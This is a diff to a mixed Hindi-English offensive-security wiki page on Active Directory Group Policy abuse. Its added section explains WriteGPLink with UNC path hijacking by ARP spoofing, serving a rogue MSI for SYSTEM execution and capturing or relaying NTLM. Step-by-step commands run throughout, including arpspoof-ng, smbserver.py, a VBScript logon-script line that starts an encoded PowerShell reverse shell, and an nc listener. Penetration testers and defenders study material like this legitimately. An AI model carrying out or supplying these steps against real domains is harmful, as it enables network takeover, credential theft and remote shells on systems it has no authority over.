-इसके अलावा, कोड निष्पादन या persistence बनाए रखने के लिए अतिरिक्त तरीके भी विचार किए जा सकते हैं, जैसे कि logon/logoff scripts का उपयोग करना, autoruns के लिए registry keys को बदलना, .msi फाइलों के माध्यम से सॉफ़्टवेयर इंस्टॉल करना, या service configurations को संपादित करना। ये तकनीकें GPOs के दुरुपयोग के जरिए पहुँच बनाए रखने और लक्ष्य प्रणालियों को नियंत्रित करने के विभिन्न रास्ते प्रदान करती हैं।
+इसके अलावा, code execute करने या persistence बनाए रखने के लिए अतिरिक्त methods, जैसे logon/logoff scripts का उपयोग, autoruns के लिए registry keys modify करना, .msi files के जरिए software install करना, या service configurations edit करना, भी विचार किए जा सकते हैं। ये techniques GPOs के abuse के माध्यम से access बनाए रखने और target systems को control करने के विभिन्न रास्ते प्रदान करती हैं।
+
+### WriteGPLink + UNC path hijacking (ARP spoofing)
+
+किसी OU/domain पर `WriteGPLink` आपको target container के `gPLink` attribute को modify करने और **GPO को खुद edit किए बिना** किसी existing GPO को **force करके apply** करने देता है। यह तब दिलचस्प होता है जब linked GPO पहले से ही **UNC paths** (`\\HOST\share\...`) के जरिए remote content reference करता हो, क्योंकि authenticated users **SYSVOL** पढ़ सकते हैं और reusable policies को offline hunt कर सकते हैं।
+
+High-level workflow:
+
+1. BloodHound का उपयोग करके ऐसा principal identify करें जिसके पास किसी OU पर `WriteGPLink` हो, और उस OU के अंदर मौजूद computers/users enumerate करें।
+2. `SYSVOL` को read-only clone करें और GPOs parse करके **Software Installation**, **drive mappings** (`Drives.xml`), और **logon/startup scripts** खोजें जो UNC paths reference करते हों।
+3. ऐसी policies को prefer करें जो **direct hostname** (उदाहरण के लिए `\\DC02\share\pkg.msi`) की ओर point करती हों, बजाय DFS/domain-namespace paths के, क्योंकि hostname-based paths को L2 spoofing से redirect करना आसान होता है।
+4. चुने गए GPO GUID को target OU के `gPLink` में append करें ताकि victim पहले से मौजूद उसी policy को process करे।
+5. उसी broadcast domain पर, UNC host का ARP spoof करें और उसकी IP को locally bind करें (`ip addr add <target_ip>/32 dev <iface>`) ताकि victim का SMB traffic आपकी host तक पहुँचे।
+6. attacker SMB server (उदाहरण के लिए `smbserver.py`) से expected path/filename serve करें और normal policy processing का इंतज़ार करें।
+
+Example `SYSVOL` collection and GPO correlation:
+```bash
+mkdir -p /mnt/$DOMAIN/SYSVOL/
+mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
+rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
+python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
+python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
+python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
+```
+मौजूदा GPO को target OU से link करें:
+```bash
+python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
+--gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
+```
+#### Software Installation UNC hijack -> SYSTEM
+
+अगर linked GPO एक UNC path से MSI deploy करता है, तो client उसे **computer startup** के दौरान fetch करेगा और उसे **`NT AUTHORITY\SYSTEM`** के रूप में install करेगा। referenced host को spoof करके और **same share/path/name** के तहत एक malicious MSI serve करके, आप **SYSVOL** को modify किए बिना `WriteGPLink` को SYSTEM code execution में बदल सकते हैं।
+
+महत्वपूर्ण constraints:
+
+- **Timing matters**: नया link policy refresh पर दिखता है (आम तौर पर ~90 minutes), लेकिन **Software Installation** आमतौर पर **reboot** पर trigger होता है।
+- Windows Installer आमतौर पर deployment को package **`ProductCode`** का उपयोग करके track करता है। अगर product पहले से installed है, तो deployment skip हो सकता है।
+- installer rejection से बचने के लिए, rogue MSI को patch करें ताकि उसका **`ProductCode`** और **`PackageCode`** GPO द्वारा expected legitimate package से match करें।
+- पुराने `.aas` advertisement files **SYSVOL** में रह सकते हैं, इसलिए उस पर भरोसा करने से पहले validate करें कि deployment अभी भी active दिख रहा है।
+```bash
+ip addr add <unc_host_ip>/32 dev <iface>
+arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
+smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
+```
+#### Drive-map UNC hijack -> NTLM capture / WebDAV relay
+
+`Drives.xml` में GPP drive mappings logon या reconnection के दौरान users को configured UNC path पर authenticate कराते हैं। अगर आप referenced host को spoof करते हैं, तो आप **NetNTLMv2** capture कर सकते हैं। अगर SMB को deliberately fail कराया जाए, तो Windows **WebDAV** over retry कर सकता है, जिससे **NTLM over HTTP** भेजा जाता है, जो **LDAP(S)**, **AD CS**, या **SMB** तक relays के लिए कहीं अधिक flexible होता है।
+
+#### Logon/startup script UNC hijack
+
+यही pattern `SYSVOL` में मिले UNC-hosted scripts पर भी लागू होता है:
+
+- **Logon scripts** आमतौर पर **user** context में execute होते हैं।
+- **Startup scripts** आमतौर पर **computer / SYSTEM** context में execute होते हैं।
+
+अगर script path किसी spoofable hostname की ओर point करता है, तो UNC host को redirect करें और expected location से replacement script content serve करें।
 
 ## SYSVOL/NETLOGON Logon Script Poisoning
 
-Writable paths under `\\<dc>\SYSVOL\<domain>\scripts\` or `\\<dc>\NETLOGON\` allow tampering with logon scripts executed at user logon via GPO. This yields code execution in the security context of logging users.
+`\\<dc>\SYSVOL\<domain>\scripts\` या `\\<dc>\NETLOGON\` के under writable paths, GPO के जरिए user logon पर execute होने वाले logon scripts में tampering की अनुमति देते हैं। इससे logging users के security context में code execution मिलता है।
 
 ### Locate logon scripts
-- Inspect user attributes for a configured logon script:
+- user attributes में configured logon script की जांच करें:
 ```powershell
 Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
 ```
-- डोमेन शेयरों को क्रॉल करके शॉर्टकट या scripts के संदर्भ उजागर करें:
+- scripts के shortcuts या references को surface करने के लिए domain shares को crawl करें:
 ```bash
 # NetExec spider (authenticated)
 netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
 ```
-- `.lnk` फ़ाइलों को पार्स करके उन targets का पता लगाएँ जो SYSVOL/NETLOGON की ओर इशारा करते हैं (DFIR के लिए उपयोगी ट्रिक और उन attackers के लिए जिनके पास सीधे GPO access नहीं है):
+- `.lnk` फ़ाइलों को parse करें ताकि SYSVOL/NETLOGON की ओर pointing targets resolve किए जा सकें (एक useful DFIR trick और उन attackers के लिए भी जो सीधे GPO access नहीं रखते):
 ```bash
 # LnkParse3
 lnkparse login.vbs.lnk
 # Example target revealed:
 # C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
 ```
-- BloodHound उपस्थित होने पर उपयोगकर्ता नोड्स पर `logonScript` (scriptPath) attribute दिखाता है।
+- BloodHound user nodes पर मौजूद होने पर `logonScript` (scriptPath) attribute दिखाता है।
 
-### लेखन पहुँच सत्यापित करें (शेयर लिस्टिंग्स पर भरोसा न करें)
-ऑटोमेटेड टूलिंग SYSVOL/NETLOGON को read-only दिखा सकती है, लेकिन अंतर्निहित NTFS ACLs फिर भी लिखने की अनुमति दे सकते हैं। हमेशा जाँचें:
+### write access validate करें (share listings पर भरोसा न करें)
+Automated tooling SYSVOL/NETLOGON को read-only दिखा सकती है, लेकिन underlying NTFS ACLs फिर भी writes allow कर सकती हैं। हमेशा test करें:
 ```bash
 # Interactive write test
 smbclient \\<dc>\SYSVOL -U <user>%<pass>
 smb: \\> cd <domain>\scripts\
 smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
 ```
-यदि फ़ाइल का आकार या mtime बदलता है, तो आपके पास write अनुमति है। संशोधित करने से पहले मूल फ़ाइलों को सुरक्षित रखें।
+यदि file size या mtime बदलता है, तो आपके पास write है। modifying से पहले originals preserve करें।
 
-### Poison a VBScript logon script for RCE
-एक ऐसा कमांड जोड़ें जो PowerShell reverse shell लॉन्च करे (generate from revshells.com) और बिज़नेस फ़ंक्शन को तोड़े बिना मूल लॉजिक को बनाए रखें:
+### RCE के लिए VBScript logon script को poison करें
+एक command append करें जो PowerShell reverse shell (revshells.com से generate किया गया) launch करती है, और business function को break होने से बचाने के लिए original logic को बनाए रखें:
 ```vb
 ' At top of login.vbs
 Set cmdshell = CreateObject("Wscript.Shell")
@@ -265,15 +320,16 @@ cmdshell.run "powershell -e <BASE64_PAYLOAD>"
 MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
 MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
 ```
-अपने होस्ट पर सुनें और अगले इंटरैक्टिव लॉगऑन का इंतज़ार करें:
+अपने host पर listen करें और अगले interactive logon का इंतज़ार करें:
 ```bash
 rlwrap -cAr nc -lnvp 443
 ```
-नोट्स:
-- निष्पादन लॉग्ड-इन उपयोगकर्ता के token (not SYSTEM) के अंतर्गत होता है। स्कोप उस GPO लिंक (OU, site, domain) का है जो उस script को लागू कर रहा है।
-- उपयोग के बाद मूल सामग्री/टाइमस्टैम्प्स को पुनर्स्थापित करके साफ़ करें।
+Notes:
+- Execution logging user’s token के तहत होता है (SYSTEM नहीं). Scope उस GPO link (OU, site, domain) तक सीमित है जो उस script को apply कर रहा है.
+- उपयोग के बाद original content/timestamps को restore करके clean up करें.
 
-## संदर्भ
+
+## References
 
 - [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
 - [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
@@ -286,5 +342,6 @@ rlwrap -cAr nc -lnvp 443
 - [BloodyAD – AD attribute/UAC operations from Linux](https://github.com/CravateRouge/bloodyAD)
 - [Samba – net rpc (group membership)](https://www.samba.org/)
 - [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
+- [TrustedSec - ARP Around and Find Out: Hijacking GPO UNC Paths for Code Execution and NTLM Relay](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)
 
 {{#include ../../../banners/hacktricks-training.md}}
